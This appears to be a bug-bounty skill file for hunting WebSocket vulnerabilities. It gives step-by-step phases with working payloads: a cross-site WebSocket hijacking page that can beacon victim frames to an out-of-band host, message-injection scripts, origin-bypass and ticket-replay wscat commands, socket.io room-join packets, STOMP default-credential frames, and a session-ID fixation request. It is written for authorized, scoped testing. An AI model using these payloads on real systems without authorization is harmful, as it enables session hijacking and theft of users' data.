---
name: hunt-websocket
description: "Hunt WebSocket vulnerabilities — Cross-Site WebSocket Hijacking (CSWSH), missing/weak Origin validation on the WS handshake, no per-message authentication, message tampering, socket.io namespace/room authorization bypass, STOMP/MQTT-over-WS auth skip, and handshake-layer Upgrade smuggling. Use when target has WebSocket endpoints (ws:// or wss://), socket.io / SignalR / Phoenix Channels, STOMP, MQTT, SockJS, real-time features, chat, live dashboards, notifications, or trading platforms."
sources: hackerone_public, portswigger_research, cve
report_count: 11
---

# HUNT-WEBSOCKET — WebSocket Security

## Rails
- In-scope only. Two browsers: attacker origin + **your** victim test login.
- Read-only subscribe first. Privileged emits (`deleteUser`, trades) only against **your** objects, once.
- No DoS (CVE-class header bombs, ReDoS on `Sec-WebSocket-Extensions`) — fingerprint, do not weaponize.
- STOP at draft. A `101` from a foreign Origin is **not** a finding.

## Decision tree
1. Find sockets: JS `new WebSocket`, `socket.io`, SignalR, Phoenix, GraphQL `graphql-ws`/`subscriptions-transport-ws`, SockJS, `/cable`, `/ws`.
2. Auth model: ambient **cookie** vs `?token=` / `Sec-WebSocket-Protocol` / first-frame JWT. Cookie + no CSRF token → CSWSH **candidate** (Phase 2). Token in URL → Referer/log leak (`hunt-ato`).
3. **SameSite:** Chrome Lax **does not** send cookies on cross-site `WebSocket()` (subresource). CSWSH needs `SameSite=None` / missing SameSite / **sibling same-site** origin / app-set `None`. Check the cookie; do not skip CSWSH because “Lax exists” if a sibling or `None` is in play.
4. Then: per-message authz → tamper → namespace/room → GraphQL subscription IDOR → handshake smuggling.

## Surface
```
wss://host/ws  /socket.io/  /signalr  /cable  /graphql  /subscriptions
new WebSocket(  io(  Phoenix.Socket  @microsoft/signalr
```

Grounding: PortSwigger CSWSH labs; Schneider 2013; handshake DoS CVE-2020-7662 / CVE-2024-37890 exist — **do not** exploit DoS. Socket.io version fingerprint → advisory check, still prove live.

## Phase 1 — Discover
```bash
grep -rEo 'wss?://[^"'\'' ]+|new WebSocket|socket\.io|/signalr|/cable' --include='*.js' .
curl -sI -H 'Connection: Upgrade' -H 'Upgrade: websocket' \
  -H 'Sec-WebSocket-Version: 13' -H "Sec-WebSocket-Key: $(head -c16 /dev/urandom | base64)" \
  "https://$TARGET/ws"
curl -s "https://$TARGET/socket.io/?EIO=4&transport=polling" | head -c 300
```

## Phase 2 — CSWSH
Need **all three:** (a) ambient cookie auth, (b) no unguessable per-connection token, (c) Origin not enforced **at handshake *and* data**.

```html
<script>
const m = "CSWSH-"+Math.random().toString(36).slice(2);
const ws = new WebSocket("wss://TARGET/ws");
ws.onopen = () => ws.send(JSON.stringify({type:"subscribe", channel:"me", _m:m}));
ws.onmessage = e => {
  document.body.textContent += e.data;
  // navigator.sendBeacon("https://UNIQUE.oastify.com/cswsh", e.data);
};
</script>
```
Victim B logged into TARGET; page hosted on attacker origin (or sibling if Lax). **Confirm:** frames contain **B’s unique marker** (not A’s, not empty ping). OOB the payload.

**FP:** 101 then silence/close; token in query; data is public broadcast; SameSite=Lax blocking cookies from `evil.com` (try sibling / check flags).

Origin checks fail in more ways than "header missing". Still require B's data or a state change — a 101 is not the bug:

- `Origin: null` (sandboxed iframe `sandbox` without `allow-same-origin`)
- Suffix/prefix match bugs: `https://TARGET.attacker.tld`, `https://attackerTARGET`, `https://TARGET.tld.attacker.tld`
- Missing `Origin` (non-browser client) upgrades and then returns private frames
- `http://` origin accepted for a `wss://` app

Some edges enforce Origin only on the HTTP/1 `Upgrade`. If h1 is blocked and HTTP/2 is offered, retry with extended CONNECT (`:method CONNECT`, `:protocol websocket`). Same proof gate.

## Phase 2b — Advanced CSWSH & token replay

**Ticket/token in URL — replay across sessions:**
```bash
# Capture the WS upgrade URL with ticket param
# ws://TARGET/ws?ticket=abc123
# Open a new browser/incognito, connect with the same ticket:
wscat -c "wss://TARGET/ws?ticket=abc123"
# If you receive the original user's data, the ticket is not session-bound
```

**Cross-session message injection (no auth on send):**
```html
<script>
const ws = new WebSocket("wss://TARGET/ws");
ws.onopen = () => {
  // Inject a message as if from another user — no auth token required
  ws.send(JSON.stringify({type:"chat",to:"VICTIM_ID",body:"injected-UNIQ"}));
};
</script>
```
Confirm: victim's client receives the injected message. One message, your test accounts only.

**SameSite bypass via same-site sibling XSS:**
If SameSite=Lax blocks cross-site WS cookies, find XSS on any `*.target.com` sibling (even a low-impact reflected XSS). Execute the CSWSH payload from that sibling origin — same-site, cookies sent.

**Missing Origin + first-frame auth race:**
Connect without Origin header (non-browser client), send a subscribe frame *before* the server's auth challenge:
```bash
wscat -c "wss://TARGET/ws" --no-check -H "Origin: " -x '{"type":"subscribe","channel":"admin"}'
```
If data arrives before disconnection, the server processes frames before auth completes.

## Phase 3 — Per-message authz
Handshake authed ≠ every frame authed. As B (low priv) and as unauth:
```
{"type":"getUserData","userId":A_ID}
{"action":"deleteUser","userId":A_ID}   # only a disposable test user
```
**Hit:** effect on a **second channel** (REST GET, other socket). Accepted-and-ignored is not a finding.

Also send the privileged frame immediately on `open`, before any auth frame the server expects. A side effect from that race is the bug; an ack alone is not.

## Phase 4 — Tamper (finance/game)
Change `price`/`qty`/`userId` in Repeater. **Hit:** order/balance API persists the value — not UI echo. One test order.

## Phase 5 — socket.io / SignalR / Phoenix
Namespace is a **protocol packet**, not `?nsp=`:
```
# connect /admin as low-priv:  40/admin,
# join room:                  42/admin,["join",{"room":"user_A"}]
```
`40` ack empty ≠ finding. Need `42` events with **another user’s** data or a privileged side effect.

SignalR: `/hub/negotiate` then `Invoke` admin methods. Phoenix: `phx_join` `topic:user:A`.

STOMP / MQTT-over-WS / SockJS (trading, IoT, ActiveMQ, Rabbit, Mosquitto — same proof gate):
```
# STOMP: one known default (guest/guest), not a wordlist. CONNECT then SUBSCRIBE.
CONNECT\nlogin:guest\npasscode:guest\n\n\x00
SUBSCRIBE\nid:1\ndestination:/queue/OR/topic/USER_A\n\n\x00
```
MQTT `CONNECT` with empty password or the broker's documented default (`admin`/`public` — one try). SockJS: `GET /sockjs/info` then the websocket transport. **Hit:** frames contain **another client's** payload or a privileged broker destination (`$SYS/#`, `/queue/orders`). `CONNECTED` with no data is not a finding.

SameSite is browser-specific: Chrome Lax does not send cookies on cross-site `WebSocket()`. Firefox/Safari have historically differed. Capture the `Cookie` header on the Upgrade from the attacker page — do not skip CSWSH because Chrome blocked it.

## Phase 6 — GraphQL subscriptions
`connection_init` with stolen/omitted auth; `subscribe` `{ user(id:A){ email } }` or `node(id:)`. Same IDOR rules (`hunt-idor`, `hunt-graphql`). Unique marker in next payload.

## Phase 7 — Handshake Upgrade smuggling (not frames)
Once upgraded, bytes are WS frames — typing `GET /admin` into wscat does **nothing**. Probe **handshake** desync (bad `Sec-WebSocket-Version`, `Connection` mismatch) with HTTP Request Smuggler. Prove desync + impact (OAST / forbidden path) like classic smuggling (`hunt-http-smuggling`). One proof.

## Phase 8 — sid fixation (Engine.IO)
```bash
curl -s "https://$TARGET/socket.io/?EIO=4&transport=polling&sid=VICTIM_OR_FAKE"
```
200 resuming **another** sid’s stream = bug. `400 Session ID unknown` = OK.

## Validation
| Class | Proof |
|---|---|
| CSWSH | Attacker-origin page + B logged in → **B’s data** + OOB |
| No message auth | Privileged **effect** on second channel |
| Tamper | Server-side persist |
| Room/ns | Other-user `42` / events |
| STOMP/MQTT | Other-client destination payload, or broker `$SYS` / queue you should not see |
| Smuggle | Desync + OAST/impact |
| Reject | Bare 101, echo, empty namespace, `CONNECTED` with no data |

**Severity:** CSWSH + session token = **Critical**. CSWSH PII stream = **High**. Admin frames unauth = **Critical**. Financial tamper = **Critical**. Cross-tenant room = **High**.

## Chains
| WS | Compose | Impact |
|---|---|---|
| CSWSH | Token in stream | ATO (`hunt-ato`) |
| Cookie Lax + sibling | XSS/takeover on sibling | CSWSH despite Lax |
| No origin check | `hunt-csrf` CSWSH | State change |
| GraphQL sub IDOR | `hunt-idor` | Live PII |
| Upgrade smuggle | Cache/SSRF | High |

Cross-refs: `hunt-csrf`, `hunt-idor`, `hunt-session`, `hunt-graphql`, `hunt-http-smuggling`, `triage-validation`.

## Dedup gate
```bash
python3 engine/dedup.py check --program <program> --class <class> --url "<endpoint>" --title "<title>"
```
`NOVEL` → `/validate`. `LIKELY_DUP` → stop unless a concrete differentiator.
